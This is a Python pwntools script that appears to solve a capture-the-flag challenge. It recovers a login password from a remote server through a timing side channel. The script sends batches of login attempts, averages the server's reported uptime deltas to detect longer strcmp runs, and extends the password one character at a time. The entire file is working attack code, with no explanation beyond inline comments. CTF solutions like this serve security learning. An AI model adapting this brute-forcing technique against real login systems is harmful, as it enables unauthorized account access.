#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from statistics import mean
import string

from pwn import *

context.log_level = "error"

USER = "agent"
PASSWORD_CHARS = string.ascii_letters + string.digits + string.punctuation


def parse_uptime(lines: str) -> list:
    # Uptime: XXXXXXus\n

    result = []

    for line in filter(lambda l: "Uptime" in l, lines.splitlines()):
        try:
            # Strip away the "Uptime: " prefix, if given.
            uptime_end = line.index(":")
            line = line[uptime_end + 2:]
        except ValueError:
            pass

        # Strip away the "us\n" suffix.
        result.append(int(line[:-3]))

    return result


def login(username: str, password: str, attempts: int = 500) -> float:
    # Prepare the whole payload for our input to the server in advance.
    # We can eliminate a lot of network latency through this, which is a crucial optimization.
    payload = ""
    # Welcome to secret military database. Press ENTER to continue.
    payload += "\n"
    payload += f"{username}\n{password}\n" * attempts  # Login: and Password:

    print(f"Attempting to log in with credentials {username}:{password}")

    # Connect to the server and kick off our payload after the initial greeting.
    connection = remote("avr.2020.ctfcompetition.com", 1337)
    connection.sendafter(
        "Welcome to secret military database. Press ENTER to continue.", payload
    )

    # Receive the responses from the server and determine the average strcomp time.
    uptimes = [t for t in parse_uptime(connection.recvall().decode())]
    deltas = [b - a for a, b in zip(uptimes, uptimes[1:])]

    strcmp_mean = mean(deltas)
    print(f"strcmp mean: {strcmp_mean}")
    return strcmp_mean


def strcmpwn() -> str:
    password = ""
    previous_mean = 0

    while True:
        # Measure the initial strcmp mean to have a value to compare against.
        initial_mean = login(USER, password + "_")
        if initial_mean == previous_mean:
            # The literally only possibility for this check to pass is to do the strcmp on a string
            # which is already complete as the following elements will be ignored.
            break

        for i, mean in map(
            lambda c: (c[0], login(USER, password + c[1])
                       ), enumerate(PASSWORD_CHARS)
        ):
            if initial_mean != mean:
                previous_mean = mean

                # The means are different now, this means that we've hit a correct character that
                # increased the duration of the strcmp loop. Append it to the password string.
                if initial_mean < mean:
                    password += PASSWORD_CHARS[i]
                else:
                    # If we've actually come to the conclusion that the initial mean is higher than
                    # for all the other characters, our placeholder turned out to be a real char.
                    password += "_"

                print("Hit:", password)
                break

    return password


print("Password:", strcmpwn())
